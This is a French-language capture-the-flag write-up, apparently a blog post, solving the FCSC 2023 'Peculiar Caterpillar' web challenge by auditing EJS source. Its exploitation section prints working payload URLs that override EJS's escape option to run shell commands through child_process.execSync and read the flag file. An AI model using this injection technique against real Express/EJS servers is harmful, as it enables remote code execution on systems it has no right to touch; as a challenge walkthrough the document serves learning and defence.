@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>FCSC 2023 Peculiar Caterpillar Web - LexterSecurity</title><meta name="Description" content="Fun research blog "><meta property="og:title" content="FCSC 2023 Peculiar Caterpillar Web" />
+<meta property="og:description" content="Peculiar Caterpillar Analyse du code Nous allons commencer par une première analyse du code fournit par l&rsquo;auteur du challenge.
+index.js
+require(&#34;express&#34;)().set(&#34;view engine&#34;, &#34;ejs&#34;).use((req, res) =&gt; res.render(&#34;index&#34;, { name: &#34;World&#34;, ...req.query })).listen(3000); Globalement ce script ne fait qu&rsquo;importer express, configure le moteur de template ejs et renvoie une vue sur le fichier index.ejs tout envoyant un objet contenant ...req.query avec une variable name qui sera interprété au rendu par EJS pour l&rsquo;afficher sur la template index." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/fcsc-2023-peculiar-caterpillar-web/" /><meta property="og:image" content="http://example.org/img/logo.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-04T04:26:39+02:00" />
+<meta property="article:modified_time" content="2023-09-04T04:26:39+02:00" /><meta property="og:site_name" content="LexterSecurity - Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/img/logo.jpg"/>
+
+<meta name="twitter:title" content="FCSC 2023 Peculiar Caterpillar Web"/>
+<meta name="twitter:description" content="Peculiar Caterpillar Analyse du code Nous allons commencer par une première analyse du code fournit par l&rsquo;auteur du challenge.
+index.js
+require(&#34;express&#34;)().set(&#34;view engine&#34;, &#34;ejs&#34;).use((req, res) =&gt; res.render(&#34;index&#34;, { name: &#34;World&#34;, ...req.query })).listen(3000); Globalement ce script ne fait qu&rsquo;importer express, configure le moteur de template ejs et renvoie une vue sur le fichier index.ejs tout envoyant un objet contenant ...req.query avec une variable name qui sera interprété au rendu par EJS pour l&rsquo;afficher sur la template index."/>
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/fcsc-2023-peculiar-caterpillar-web/" /><link rel="prev" href="http://example.org/posts/writeup-htb-business-ctf-license-generator/" /><link rel="next" href="http://example.org/posts/fcsc-2023-tweedle-dee-web/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "FCSC 2023 Peculiar Caterpillar Web",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/fcsc-2023-peculiar-caterpillar-web\/"
+        },"genre": "posts","wordcount":  1005 ,
+        "url": "http:\/\/example.org\/posts\/fcsc-2023-peculiar-caterpillar-web\/","datePublished": "2023-09-04T04:26:39+02:00","dateModified": "2023-09-04T04:26:39+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Lxt3h"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="LexterSecurity"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/bryton.png"
+        data-srcset="/img/bryton.png, /img/bryton.png 1.5x, /img/bryton.png 2x"
+        data-sizes="auto"
+        alt="/img/bryton.png"
+        title="/img/bryton.png" width="128" height="128" />LexterSecurity</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="LexterSecurity"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/bryton.png"
+        data-srcset="/img/bryton.png, /img/bryton.png 1.5x, /img/bryton.png 2x"
+        data-sizes="auto"
+        alt="/img/bryton.png"
+        title="/img/bryton.png" width="128" height="128" />LexterSecurity</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">FCSC 2023 Peculiar Caterpillar Web</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Lxt3h</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-09-04">2023-09-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1005 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#analyse-du-code">Analyse du code</a></li>
+    <li><a href="#plan-dattaque">Plan d&rsquo;attaque</a></li>
+    <li><a href="#analyse-du-code-ejs">Analyse du code EJS</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#remerciement">Remerciement</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="peculiar-caterpillar">Peculiar Caterpillar</h1>
+<h2 id="analyse-du-code">Analyse du code</h2>
+<p>Nous allons commencer par une première analyse du code fournit par l&rsquo;auteur du challenge.</p>
+<!-- raw HTML omitted -->
+<p>index.js</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;express&#34;</span><span class="p">)().</span><span class="nx">set</span><span class="p">(</span><span class="s2">&#34;view engine&#34;</span><span class="p">,</span> <span class="s2">&#34;ejs&#34;</span><span class="p">).</span><span class="nx">use</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span>  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s2">&#34;index&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">name</span><span class="o">:</span>  <span class="s2">&#34;World&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">...</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span>
+</span></span><span class="line"><span class="cl"><span class="p">})).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
+</span></span></code></pre></div><p>Globalement ce script ne fait qu&rsquo;importer express, configure le moteur de template <strong>ejs</strong> et renvoie une vue sur le fichier index.ejs tout envoyant un objet contenant <code>...req.query</code> avec une variable <strong>name</strong> qui sera interprété au rendu par EJS pour l&rsquo;afficher sur la template index.</p>
+<p>Je note un point d&rsquo;entrée avec le <code>...req.query</code> . En effet, ce qu&rsquo;il se passe à ce moment c&rsquo;est que l&rsquo;application ne contrôle pas les données rentrées par l&rsquo;utilisateur et envoie directement cela au rendu.</p>
+<p>A ce moment là j&rsquo;avais deux idées, soit nous avions affaire à du prototype pollution, soit une SSTI.</p>
+<h2 id="plan-dattaque">Plan d&rsquo;attaque</h2>
+<p>Pour commencer, j&rsquo;ai regardé si EJS avait une CVE récente. Par chance, j&rsquo;ai trouvé la CVE-2022-29078 qui est une SSTI dans une des options évaluée au moment du rendu d&rsquo;EJS. Je suis partie sur des idées un peu farfelu, notamment le fait que je puisse essayer d&rsquo;injecter un payload depuis name, mais j&rsquo;ai vite abandonné l&rsquo;injection de paramètres en aveugle.</p>
+<p>J&rsquo;ai décidé de me lancer dans la découverte du code source EJS.</p>
+<ul>
+<li>Analyser le patch de la CVE-2022-29078</li>
+<li>Prendre en main le code source d&rsquo;EJS</li>
+<li>Analyser le système de rendu afin de trouver des erreurs de parsing ou des injections.</li>
+</ul>
+<h2 id="analyse-du-code-ejs">Analyse du code EJS</h2>
+<p>Je n&rsquo;ai trouvé aucun article à ce sujet, j&rsquo;ai du fouiller dans l&rsquo;entièreté du script afin d&rsquo;aboutir à une vulnérabilité.</p>
+<p>Pour commencer, j&rsquo;ai analysé le contexte vulnérable que la CVE-2022-29078 exploitait.
+<strong>Code vulnérable:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">prepended</span> <span class="o">+=</span> <span class="s1">&#39; var __output = &#34;&#34;;\n&#39;</span> <span class="o">+</span> <span class="s1">&#39; function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }\n&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">	<span class="nx">prepended</span> <span class="o">+=</span> <span class="s1">&#39; var &#39;</span> <span class="o">+</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span> <span class="o">+</span> <span class="s1">&#39; = __append;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>Code patché:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">prepended</span> <span class="o">+=</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39; var __output = &#34;&#34;;\n&#39;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39; function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">_JS_IDENTIFIER</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;outputFunctionName is not a valid JS identifier.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">prepended</span> <span class="o">+=</span> <span class="s1">&#39; var &#39;</span> <span class="o">+</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span> <span class="o">+</span> <span class="s1">&#39; = __append;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></div><p>On peut voir que l&rsquo;application vérifie notre entrée via une regex.</p>
+<p><strong>Regex:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">_JS_IDENTIFIER</span> <span class="o">=</span> <span class="sr">/^[a-zA-Z_$][0-9a-zA-Z_$]*$/</span><span class="p">;</span>
+</span></span></code></pre></div><p><strong>Permissions de la regex:</strong></p>
+<ul>
+<li>Caractères alphanumériques</li>
+<li>$ et _</li>
+<li>Du début à la fin de la string</li>
+</ul>
+<p>Les permissions sont trop restrictives, nous ne pourrons injecter de payload. Etant donné que nous pouvons envoyer n&rsquo;importe quel paramètre URL à EJS, nous avons la possibilité d&rsquo;écraser des valeurs de configuration EJS.</p>
+<p>J&rsquo;ai donc cherché dans l&rsquo;entièreté du script d&rsquo;EJS là ou je pouvais trouver un endroit ou mon pattern était évalué au rendu et surtout non filtré.</p>
+<p>J&rsquo;ai eu énormément de faux espoir durant ma nuit de tryhard, mais en persistant j&rsquo;ai trouvé un pattern intéressant.</p>
+<p>En cherchant quels paramètres dont j&rsquo;avais le contrôle, j&rsquo;ai trouvé cette ligne.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">client</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;escapeFn = escapeFn || &#39;</span> <span class="o">+</span> <span class="nx">escapeFn</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span> <span class="o">+</span> <span class="nx">src</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">compileDebug</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;rethrow = rethrow || &#39;</span> <span class="o">+</span> <span class="nx">rethrow</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span> <span class="o">+</span> <span class="nx">src</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>A ce moment, j&rsquo;ai vu le bout du tunnel. En effet, je pouvais contrôler la valeur de <code>escapeFn</code> par l&rsquo;intermédiaire de <code>opts.escape</code>, nous remarquons également que l&rsquo;entrée n&rsquo;est pas filtré. Si j&rsquo;active l&rsquo;option client et que je met un code javascript arbitraire en paramètre, comment réagirait mon programme ?</p>
+<!-- raw HTML omitted -->
+<h2 id="exploitation">Exploitation</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.discordapp.com/attachments/858439417743540225/1101669413746393088/image.png"
+        data-srcset="https://cdn.discordapp.com/attachments/858439417743540225/1101669413746393088/image.png, https://cdn.discordapp.com/attachments/858439417743540225/1101669413746393088/image.png 1.5x, https://cdn.discordapp.com/attachments/858439417743540225/1101669413746393088/image.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.discordapp.com/attachments/858439417743540225/1101669413746393088/image.png"
+        title="https://cdn.discordapp.com/attachments/858439417743540225/1101669413746393088/image.png" /></p>
+<p>Ne vous fiez pas à son apparence, il est plus coriace que vous ne le pensez.</p>
+<p>D&rsquo;après le code source, lorsque nous mettons à <strong>true</strong> l&rsquo;option de <strong>debug</strong> nous pouvons voir le script généré par le compiler d&rsquo;EJS cependant comme nous avons vu dans ce code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">client</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;escapeFn = escapeFn || &#39;</span> <span class="o">+</span> <span class="nx">escapeFn</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span> <span class="o">+</span> <span class="nx">src</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">compileDebug</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;rethrow = rethrow || &#39;</span> <span class="o">+</span> <span class="nx">rethrow</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span> <span class="o">+</span> <span class="nx">src</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Pour que notre <strong>escapeFn</strong> s&rsquo;affiche dans le rendu, il faut tout d&rsquo;abord activer l&rsquo;option <strong>client</strong>.</p>
+<!-- raw HTML omitted -->
+<p>En activant le mode debug et le client on peut en effet voir la ligne généré par le code ci-dessus.</p>
+<p>Maintenant remplaçons la valeur à l&rsquo;intérieur de <strong>escapeFunc</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">https</span><span class="o">:</span><span class="c1">//peculiar-caterpillar.france-cybersecurity-challenge.fr/?client=true&amp;settings[view+options][escape]=deadbeef&amp;debug=true
+</span></span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.discordapp.com/attachments/858439417743540225/1101681522345513000/image.png"
+        data-srcset="https://cdn.discordapp.com/attachments/858439417743540225/1101681522345513000/image.png, https://cdn.discordapp.com/attachments/858439417743540225/1101681522345513000/image.png 1.5x, https://cdn.discordapp.com/attachments/858439417743540225/1101681522345513000/image.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.discordapp.com/attachments/858439417743540225/1101681522345513000/image.png"
+        title="https://cdn.discordapp.com/attachments/858439417743540225/1101681522345513000/image.png" /></p>
+<p>On peut voir que nous avons une erreur et ce qui est intéressant c&rsquo;est que notre valeur d&rsquo;entrée est affichée, cela veut dire que celle-ci à bien été évalué au render. Mais d&rsquo;ou vient cette erreur?
+Il faut comprendre que ce qui est stocké dans <strong>escapeFunc</strong> de base est une fonction javascript qui prend un argument et qui vérifie la présence de caractères html puis retourne la valeur.</p>
+<!-- raw HTML omitted -->
+<p>Si l&rsquo;on regarde plus bas, on voit qu&rsquo;il passe notre argument <strong>name</strong> dans <strong>escapeFn</strong> mais pas que, il y a également la fonction <strong>rethrow</strong> qui prend en entrée notre fonction.</p>
+<!-- raw HTML omitted -->
+<p>Et si on lit le code source on peut voir qu&rsquo;il s&rsquo;agit de la fonction qui trigger les erreurs de rendu, je mets du javascript dans l&rsquo;option <strong>escapeFunc</strong> maintenant.</p>
+<p>Etant donné que nous avons une fonction qui prend en paramètre une valeur et la retourne, nous devons recréer cette même fonction.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">https</span><span class="o">:</span><span class="c1">//peculiar-caterpillar.france-cybersecurity-challenge.fr/?client=true&amp;settings[view+options][escape]=function(d){return d}
+</span></span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.discordapp.com/attachments/858439417743540225/1101685127047819344/image.png"
+        data-srcset="https://cdn.discordapp.com/attachments/858439417743540225/1101685127047819344/image.png, https://cdn.discordapp.com/attachments/858439417743540225/1101685127047819344/image.png 1.5x, https://cdn.discordapp.com/attachments/858439417743540225/1101685127047819344/image.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.discordapp.com/attachments/858439417743540225/1101685127047819344/image.png"
+        title="https://cdn.discordapp.com/attachments/858439417743540225/1101685127047819344/image.png" /></p>
+<p>Ce qui est intéressant, c&rsquo;est que nous possédons l&rsquo;équivalent d&rsquo;un middleware. Tout ce qui passe dans <strong>name</strong> passe dans notre fameuse fonction, profitons de cela pour exécuter une commande sur le serveur.</p>
+<blockquote>
+<p><strong>Remarque:</strong> La fonctionnalité <strong>escapeFn</strong> est conçue pour protéger des XSS, c&rsquo;est pourquoi nos arguments de rendu passe par <strong>escapeFn</strong></p>
+</blockquote>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">https</span><span class="o">:</span><span class="c1">//peculiar-caterpillar.france-cybersecurity-challenge.fr/?client=true&amp;settings[view+options][escape]=function(d){ return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls&#39;);}
+</span></span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.discordapp.com/attachments/858439417743540225/1101685686463123476/image.png"
+        data-srcset="https://cdn.discordapp.com/attachments/858439417743540225/1101685686463123476/image.png, https://cdn.discordapp.com/attachments/858439417743540225/1101685686463123476/image.png 1.5x, https://cdn.discordapp.com/attachments/858439417743540225/1101685686463123476/image.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.discordapp.com/attachments/858439417743540225/1101685686463123476/image.png"
+        title="https://cdn.discordapp.com/attachments/858439417743540225/1101685686463123476/image.png" /></p>
+<p>Nous avons redirigé le résultat de notre requête et nous pouvons ainsi lire le fichier du flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">https</span><span class="o">:</span><span class="c1">//peculiar-caterpillar.france-cybersecurity-challenge.fr/?client=true&amp;settings[view+options][escape]=function(d){ return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat flag-a49d3e9518ee659fa932482818e7eeeb.txt&#39;);}
+</span></span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.discordapp.com/attachments/858439417743540225/1101686109026660362/image.png"
+        data-srcset="https://cdn.discordapp.com/attachments/858439417743540225/1101686109026660362/image.png, https://cdn.discordapp.com/attachments/858439417743540225/1101686109026660362/image.png 1.5x, https://cdn.discordapp.com/attachments/858439417743540225/1101686109026660362/image.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.discordapp.com/attachments/858439417743540225/1101686109026660362/image.png"
+        title="https://cdn.discordapp.com/attachments/858439417743540225/1101686109026660362/image.png" /></p>
+<p><strong>Flag:</strong> <code>FCSC{232448f3783105b36ab9d5f90754417a4f17931b4bdeeb6f301af2db0088cef6}</code></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>J&rsquo;ai appris énormément de chose durant ce challenge, je suis vraiment fier d&rsquo;avoir trouver ma vulnérabilité en auditant de font en comble le code source d&rsquo;EJS.</p>
+<p>Et pour conclure cela, contrôlez vos input.</p>
+<h2 id="remerciement">Remerciement</h2>
+<p>Je tenais à remercier l&rsquo;auteur du challenge <strong>Bitk</strong> j&rsquo;ai énormément apprécié le challenge et la plupart de ses challenges par ailleurs. J&rsquo;ai trouvé ce CTF très bénéfique pour mon apprentissage alors merci aux organisateurs et aux créateurs des challenges.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-09-04</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/posts/fcsc-2023-peculiar-caterpillar-web/" data-title="FCSC 2023 Peculiar Caterpillar Web"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/fcsc-2023-peculiar-caterpillar-web/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/posts/fcsc-2023-peculiar-caterpillar-web/" data-title="FCSC 2023 Peculiar Caterpillar Web"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/posts/fcsc-2023-peculiar-caterpillar-web/" data-title="FCSC 2023 Peculiar Caterpillar Web"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/posts/fcsc-2023-peculiar-caterpillar-web/" data-title="FCSC 2023 Peculiar Caterpillar Web"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/writeup-htb-business-ctf-license-generator/" class="prev" rel="prev" title="Writeup HTB Business CTF License Generator"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Writeup HTB Business CTF License Generator</a>
+            <a href="/posts/fcsc-2023-tweedle-dee-web/" class="next" rel="next" title="FCSC 2023 Tweedle Dee Web">FCSC 2023 Tweedle Dee Web<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.118.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Lxt3h</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
